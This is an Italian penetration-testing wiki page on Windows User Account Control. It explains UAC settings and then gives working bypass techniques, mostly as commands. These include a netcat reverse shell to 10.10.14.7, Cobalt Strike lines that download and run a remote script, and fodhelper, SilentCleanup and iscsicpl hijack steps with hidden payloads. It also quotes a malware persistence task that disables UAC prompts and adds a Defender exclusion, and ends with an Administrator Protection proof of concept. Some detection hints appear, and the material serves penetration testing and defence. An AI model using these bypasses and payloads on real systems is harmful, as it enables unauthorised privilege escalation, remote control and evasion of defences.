# UAC - Controllo dell'account utente

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per le attività con elevazione**. Le applicazioni hanno diversi livelli di `integrity` e un programma con un **livello elevato** può eseguire attività che **potenzialmente potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e le attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore**, a meno che un amministratore non autorizzi esplicitamente tali applicazioni/attività ad avere accesso a livello amministratore al sistema per poter essere eseguite. È una funzionalità di praticità che protegge gli amministratori da modifiche involontarie, ma non è considerata un confine di sicurezza.<sup>[[2]](#references)</sup>

Per ulteriori informazioni sui livelli di integrità:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Quando UAC è attivo, a un utente amministratore vengono assegnati 2 token: un token utente standard, per eseguire azioni ordinarie con integrità media, e uno con i privilegi amministrativi.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) descrive in modo molto approfondito il funzionamento di UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC.<sup>[[2]](#references)</sup> Gli amministratori possono usare i criteri di sicurezza per configurare il funzionamento di UAC in base alle esigenze della propria organizzazione a livello locale (usando secpol.msc), oppure configurarli e distribuirli tramite Group Policy Objects (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono descritte in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Esistono 10 impostazioni di Group Policy configurabili per UAC. La tabella seguente fornisce ulteriori dettagli:

| Impostazione di Group Policy                                                                                                                                                                                                                                                                                                                                                           | Chiave del Registro di sistema                | Impostazione predefinita                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Controllo dell'account utente: modalità di approvazione dell'amministratore per l'account Administrator integrato](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabilitata)                                             |
| [Controllo dell'account utente: comportamento della richiesta di elevazione per gli amministratori in modalità di approvazione dell'amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Richiedi il consenso per i binari non Windows sul desktop protetto) |
| [Controllo dell'account utente: comportamento della richiesta di elevazione per gli utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Richiedi le credenziali sul desktop protetto)         |
| [Controllo dell'account utente: rileva le installazioni delle applicazioni e richiedi l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Abilitata; disabilitata per impostazione predefinita in Enterprise)           |
| [Controllo dell'account utente: eleva solo gli eseguibili firmati e con firma convalidata](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabilitata)                                             |
| [Controllo dell'account utente: eleva solo le applicazioni UIAccess installate in percorsi sicuri](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Abilitata)                                              |
| [Controllo dell'account utente: esegui tutti gli amministratori in modalità di approvazione dell'amministratore](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Abilitata)                                              |
| [Controllo dell'account utente: consenti alle applicazioni UIAccess di richiedere l'elevazione senza usare il desktop protetto](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabilitata)                                             |
| [Controllo dell'account utente: passa al desktop protetto quando richiedi l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Abilitata)                                              |
| [Controllo dell'account utente: virtualizza gli errori di scrittura di file e Registro di sistema nei percorsi per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Abilitata)                                              |

### Criteri per l'installazione del software su Windows

I **criteri di sicurezza locali** ("secpol.msc" nella maggior parte dei sistemi) sono configurati per impostazione predefinita in modo da **impedire agli utenti non amministratori di eseguire installazioni software**. Ciò significa che, anche se un utente non amministratore può scaricare l'installer del software, non potrà eseguirlo senza un account amministratore.

### Chiavi del Registro di sistema per obbligare UAC a richiedere l'elevazione

Come utente standard senza diritti amministrativi, puoi fare in modo che l'account "standard" riceva una **richiesta delle credenziali da parte di UAC** quando tenta di eseguire determinate azioni. Questa operazione richiede la modifica di alcune **chiavi del Registro di sistema**, per le quali sono necessarie autorizzazioni amministrative, a meno che non sia presente un **UAC bypass** o l'attaccante non abbia già effettuato l'accesso come amministratore.

Anche se l'utente appartiene al gruppo **Administrators**, queste modifiche obbligano l'utente a **inserire nuovamente le credenziali del proprio account** per eseguire azioni amministrative.

**In pratica, questo è utile solo quando si dispone già di un token elevato, di un UAC bypass o di una configurazione errata che consente di modificare queste chiavi; in caso contrario, la scrittura nel Registro di sistema viene bloccata.**

Le chiavi e le voci del Registro di sistema da modificare sono le seguenti (con i relativi valori predefiniti tra parentesi):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Questa operazione può essere eseguita anche manualmente tramite lo strumento Criteri di sicurezza locali. Dopo la modifica, le operazioni amministrative richiedono all'utente di inserire nuovamente le proprie credenziali.

### Nota

**User Account Control non è un confine di sicurezza.** Pertanto, gli utenti standard non possono evadere dai propri account e ottenere diritti di amministratore senza un exploit di escalation dei privilegi locali.

### Chiedere a un utente il "pieno accesso al computer"
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### Privilegi UAC

- La modalità protetta di Internet Explorer utilizza controlli di integrità per impedire ai processi con un livello di integrità elevato (come i browser web) di accedere a dati con un livello di integrità basso (come la cartella dei file Internet temporanei). Questo avviene eseguendo il browser con un token a bassa integrità. Quando il browser tenta di accedere ai dati archiviati nella zona a bassa integrità, il sistema operativo verifica il livello di integrità del processo e consente l'accesso di conseguenza. Questa funzionalità aiuta a impedire che gli attacchi di esecuzione remota del codice accedano ai dati sensibili del sistema.
- Quando un utente effettua l'accesso a Windows, il sistema crea un token di accesso che contiene un elenco dei privilegi dell'utente. I privilegi sono definiti come la combinazione dei diritti e delle capacità di un utente. Il token contiene anche un elenco delle credenziali dell'utente, ovvero le credenziali utilizzate per autenticare l'utente al computer e alle risorse sulla rete.

### Autoadminlogon

Per configurare Windows in modo che effettui automaticamente l'accesso con un utente specifico all'avvio, imposta la **chiave di registro `AutoAdminLogon`**. Questa configurazione è utile negli ambienti kiosk o a scopo di test. Usala solo su sistemi sicuri, poiché espone la password nel registro.

Imposta le chiavi seguenti utilizzando l'Editor del Registro di sistema o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Per ripristinare il comportamento normale di accesso, imposta `AutoAdminLogon` su 0.

## UAC bypass

> [!TIP]
> Nota che, se hai accesso grafico alla vittima, UAC bypass è semplice, poiché puoi fare clic su "Sì" quando compare la richiesta UAC

UAC bypass è necessario nella seguente situazione: **UAC è attivato, il processo è in esecuzione in un contesto di integrità media e l'utente appartiene al gruppo administrators**.

È importante specificare che è **molto più difficile eseguire UAC bypass se il livello di sicurezza è impostato sul valore massimo (Always) rispetto a uno qualsiasi degli altri livelli (Default).**

### Fast triage da una shell a integrità media

Prima di tentare un bypass, verifica di trovarti nello scenario corretto e associa la build dell'host ai metodi noti e funzionanti:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Note pratiche:
- Se `EnableLUA=0`, non è necessario alcun bypass: qualsiasi token admin può richiedere direttamente un livello di integrità elevato.
- `ConsentPromptBehaviorAdmin=2` o `5` è lo scenario comune per i bypass basati su auto-elevate / COM.
- `Always Notify` innalza il livello di difficoltà, ma è comunque opportuno testare la build esatta invece di presumere un fallimento: UACME continua a tracciare alcuni metodi `AlwaysNotify compatible` sulle build moderne di Windows.<sup>[[3]](#references)</sup>

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**), puoi **eseguire una reverse shell con privilegi admin** (livello di integrità elevato) usando qualcosa come:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass con duplicazione del token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** Basic UAC "bypass" (accesso completo al file system)

Se hai una shell con un utente che appartiene al gruppo Administrators, puoi **montare la condivisione C$** tramite SMB (file system) localmente su un nuovo disco e avrai **accesso a tutto ciò che si trova all'interno del file system** (anche alla home folder dell'Administrator).

> [!WARNING]
> **Sembra che questo trick non funzioni più**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass con Cobalt Strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al livello di sicurezza massimo
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
Anche **Empire** e **Metasploit** dispongono di diversi moduli per il **bypass** dell'**UAC**.

### Interfacce COM con privilegi elevati (`ICMLuaUtil` / `CMSTPLUA`)

Gli oggetti COM auto-elevati continuano a rappresentare una superficie UAC pratica nelle build moderne. `ICMLuaUtil` è ancora indicato da UACME come funzionante sui rami attuali di Windows, mentre gli strumenti offensivi continuano ad adattare `CMSTPLUA` combinando un processo desktop interattivo, l'esecuzione a 64 bit e, talvolta, il masquerading del PEB/processo prima di invocare il COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consigli pratici:
- Preferire un processo **64-bit** nella **sessione interattiva** dell'utente (comunemente `explorer.exe` o un suo processo figlio).
- Se una shell grezza fallisce, riprovare da un'implementazione BOF / UACME invece di un semplice wrapper `CreateProcess`.
- Prevedere che l'esecuzione del processo figlio avvenga in un **processo elevato separato**; molti BOF non elevano il beacon corrente direttamente.

### KRBUACBypass

Documentazione e tool disponibili su [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit per il bypass dell'UAC

[**UACME**](https://github.com/hfiref0x/UACME) è una raccolta di tecniche di bypass dell'UAC. Compilarlo con Visual Studio o MSBuild; la build crea diversi eseguibili (ad esempio, `Source\Akagi\output\x64\Debug\Akagi.exe`), quindi selezionare il metodo appropriato per la build target.<sup>[[3]](#references)</sup>\
Prestare attenzione: alcuni bypass avviano programmi o prompt visibili che possono avvisare l'utente.<sup>[[3]](#references)</sup>

UACME indica la **build version a partire dalla quale ciascuna tecnica ha iniziato a funzionare**.<sup>[[3]](#references)</sup> È possibile cercare una tecnica che influisca sulle proprie versioni:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, utilizzando [questa](https://en.wikipedia.org/wiki/Windows_10_version_history) pagina si ricava la release di Windows `1607` dalle versioni delle build.

Un workflow pratico consiste nel **valutare prima la build dell'host** e solo successivamente eseguire il metodo corrispondente:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` confronta rapidamente la build locale con i suoi metodi UAC noti, utile per scartare velocemente i PoC non più funzionanti.<sup>[[4]](#references)</sup>
- `UACME` rimane il miglior catalogo pubblico per associare un bypass a una build precisa. Le release recenti hanno aggiunto nuovi metodi e sottoposto nuovamente quelli esistenti a test su **Windows 11 25H2**; quindi, prima di presumere che un vecchio post di un blog sia ancora applicabile senza modifiche, ricontrolla il README e le release notes.<sup>[[3]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Il binary attendibile `fodhelper.exe` viene eseguito con auto-elevazione nelle versioni moderne di Windows. All'avvio, interroga il percorso di registro per-utente riportato di seguito senza validare il verbo `DelegateExecute`. Inserire un comando in quel percorso consente a un processo con Medium Integrity (l'utente appartiene al gruppo Administrators) di avviare un processo con High Integrity senza un prompt UAC.

Percorso di registro interrogato da fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Passaggi PowerShell (imposta il tuo payload, quindi attivalo)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Note:
- Funziona quando l'utente corrente è membro del gruppo Administrators e il livello UAC è quello predefinito/accondiscendente (non Always Notify con restrizioni aggiuntive).
- Usa il percorso `sysnative` per avviare una PowerShell a 64 bit da un processo a 32 bit su Windows a 64 bit.
- Il payload può essere qualsiasi comando (PowerShell, cmd o il percorso di un EXE). Evita le interfacce che richiedono conferma per una maggiore stealth.

#### CurVer/extension hijack variant (HKCU only)

Campioni recenti che abusano di `fodhelper.exe` evitano `DelegateExecute` e invece **reindirizzano il ProgID `ms-settings`** tramite il valore `CurVer` per-utente. Il binario con elevazione automatica risolve comunque il gestore in `HKCU`, quindi non è necessario un token amministrativo per inserire le chiavi:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Una volta ottenuti privilegi elevati, il malware comunemente **disabilita le richieste future** impostando `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` su `0`, quindi esegue ulteriori operazioni di elusione delle difese (ad esempio, `Add-MpPreference -ExclusionPath C:\ProgramData`) e ricrea la persistenza per essere eseguito con integrità elevata. Un'attività di persistenza tipica memorizza su disco uno **script PowerShell crittografato con XOR** e lo decodifica/esegue in memoria ogni ora:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Questa variante esegue comunque la pulizia del **`dropper`** e lascia solo gli **staged payload**, rendendo il rilevamento dipendente dal monitoraggio del **`CurVer` hijack**, della manomissione di `ConsentPromptBehaviorAdmin`, della creazione di esclusioni di Defender o di attività pianificate che decrittano PowerShell in memoria.<sup>[[5]](#references)</sup>

### UAC bypass tramite l'attività `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` avvia `cleanmgr.exe` con i privilegi massimi ed espande `%windir%` dall'ambiente dell'utente. Se controlli `HKCU\Environment\windir`, puoi reindirizzare tale espansione verso un comando arbitrario e ottenere un'elevata integrità senza una finestra di consenso.<sup>[[8]](#references)</sup> Questo metodo merita ancora di essere testato sulle build recenti, perché UACME mantiene attiva la tecnica e il monitoraggio recente dei problemi indica che Windows 11 24H2 potrebbe richiedere solo piccoli aggiustamenti alle virgolette.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Se il task cita il percorso in quella build, riprova con il payload che termina con una virgoletta (ad esempio `cmd.exe"`). Dopo i test, elimina sempre `HKCU\Environment\windir`.

#### Altri UAC bypass

Molti UAC bypass classici che abusano dei flussi dell'interfaccia utente, degli oggetti COM o dell'interazione con il desktop richiedono una **full interactive session** con la vittima; una shell `nc.exe` comune o un servizio in **Session 0** spesso non sono sufficienti.

Spesso puoi risolvere il problema usando una sessione **meterpreter**. Esegui la migrazione verso un **process** con il valore **Session** uguale a **1**:

![Imposta ms-settings su un'estensione personalizzata (.thm) e associa tale estensione al nostro payload - Altri UAC bypass: puoi farlo usando una sessione meterpreter. Esegui la migrazione verso un process con Session...](<../../images/image (863).png>)

(_explorer.exe_ dovrebbe funzionare)

### UAC Bypass con GUI

Se hai accesso a una **GUI**, puoi semplicemente accettare la richiesta UAC quando viene visualizzata; non hai realmente bisogno di un bypass tecnico. Pertanto, ottenere una sessione GUI è spesso sufficiente per aggirare l'ostacolo pratico aggiunto dall'UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava utilizzando (potenzialmente tramite RDP), potrebbero essere in esecuzione **alcuni strumenti come administrator**, dai quali potresti **eseguire** direttamente un **cmd**, ad esempio **come admin**, senza che l'UAC lo richieda nuovamente, come con [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **stealthy**.

### UAC bypass con brute-force rumoroso

Se il rumore è accettabile, uno strumento come [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) può richiedere ripetutamente l'elevazione finché l'utente non la accetta.

### Il tuo bypass - Metodologia di base per UAC bypass

Se dai un'occhiata a **UACME**, noterai che **molti UAC bypass abusano del DLL hijacking** (spesso facendo caricare a un binary elevato una DLL controllata dall'attaccante da un percorso scrivibile). [Leggi qui per scoprire come individuare una vulnerabilità di DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Trova un binary che esegua **autoelevate** (verifica che, quando viene eseguito, funzioni con un livello di integrità elevato).
2. Con procmon, trova gli eventi "**NAME NOT FOUND**" che possono essere vulnerabili al **DLL Hijacking**.
3. Probabilmente dovrai **scrivere** la DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32), per i quali non disponi dei permessi di scrittura. Puoi aggirare il problema usando:
1. **wusa.exe**: Windows 7,8 e 8.1. Consente di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo strumento viene eseguito con un livello di integrità elevato).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare la tua DLL nel percorso protetto ed eseguire il binary vulnerabile e autoelevato.

### Un'altra tecnica di UAC bypass

Consiste nel verificare se un **binary autoElevated** prova a **leggere** dal **registry** il **nome/percorso** di un **binary** o di un **comando** da **eseguire** (questo è più interessante se il binary cerca queste informazioni all'interno di **HKCU**).

### UAC bypass tramite `SysWOW64\iscsicpl.exe` + DLL hijack del `PATH` dell'utente

Il binary a 32 bit `C:\Windows\SysWOW64\iscsicpl.exe` è un binary **auto-elevated** che può essere abusato per caricare `iscsiexe.dll` in base all'ordine di ricerca. Se puoi inserire una `iscsiexe.dll` malevola all'interno di una cartella **scrivibile dall'utente** e modificare quindi il `PATH` dell'utente corrente (ad esempio tramite `HKCU\Environment\Path`) in modo che tale cartella venga cercata, Windows potrebbe caricare la DLL dell'attaccante all'interno del processo elevato `iscsicpl.exe` **senza visualizzare una richiesta UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Note pratiche:
- È utile quando l'utente corrente appartiene agli **Administrators** ma opera con **Medium Integrity** a causa dell'UAC.
- La copia **SysWOW64** è quella rilevante per questo bypass. Considera la copia **System32** come un binary separato e verifica il comportamento indipendentemente.
- La primitive è una combinazione di **auto-elevation** e **DLL search-order hijacking**, quindi lo stesso flusso di lavoro con ProcMon utilizzato per altri UAC bypass è utile per validare il caricamento della DLL mancante.

Flusso minimo:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Idee per il rilevamento:
- Generare un alert su `reg add` / scritture nel registro in `HKCU\Environment\Path` seguite immediatamente dall'esecuzione di `C:\Windows\SysWOW64\iscsicpl.exe`.
- Cercare `iscsiexe.dll` in posizioni **controllate dall'utente** come `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlare l'avvio di `iscsicpl.exe` con processi figlio imprevisti o caricamenti di DLL al di fuori delle normali directory di Windows.

### Ricerche più recenti da verificare separatamente

Alcune catene successive al 2024 non assomigliano più ai classici registry hijack di `HKCU\Software\Classes`. Ad esempio, l'avvelenamento della activation-context cache può concatenare un **drive remap** e una **DLL redirection** per passare da un'integrità media a una elevata tramite binary di UI affidabili / auto-elevated come `ctfmon.exe` e target successivi come `fodhelper.exe`. Invece di duplicare qui il grande PoC, controllare gli esempi compatti di payload in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Hijack della lettera di unità di Administrator Protection (25H2) tramite per-logon-session DOS device map

Per l'intera attack surface di `RAiLaunchAdminProcess` / UIAccess su Windows 11 25H2, consultare la pagina dedicata:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” utilizza shadow-admin tokens con mappe `\Sessions\0\DosDevices/<LUID>` per sessione. La directory viene creata lazy da `SeGetTokenDeviceMap` alla prima risoluzione di `\??`. Se l'attaccante impersona lo shadow-admin token solo a livello **SecurityIdentification**, la directory viene creata con l'attaccante come **owner** (eredita `CREATOR OWNER`), consentendo drive-letter links che hanno precedenza su `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Passaggi:**

1. Da una sessione con privilegi ridotti, chiamare `RAiProcessRunOnce` per avviare un `runonce.exe` shadow-admin senza prompt.
2. Duplicare il suo primary token in un token di tipo **identification** e impersonarlo durante l'apertura di `\??` per forzare la creazione di `\Sessions\0\DosDevices/<LUID>` con l'attaccante come owner.
3. Creare in quella posizione un symlink `C:` che punti a uno storage controllato dall'attaccante; i successivi accessi al filesystem in quella sessione risolveranno `C:` nel percorso dell'attaccante, consentendo un DLL/file hijack senza prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Come funziona User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Raccolta di tecniche per bypassare UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Scanner di compatibilità e launcher per bypassare UAC](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI adotta l'AI per generare backdoor PowerShell](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operazione TrueChaos: sfruttamento di una vulnerabilità 0-Day contro obiettivi governativi del Sud-est asiatico](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Bypass della protezione degli amministratori di Windows](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Bypass di UAC tramite l'attività SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
{{#include ../../banners/hacktricks-training.md}}
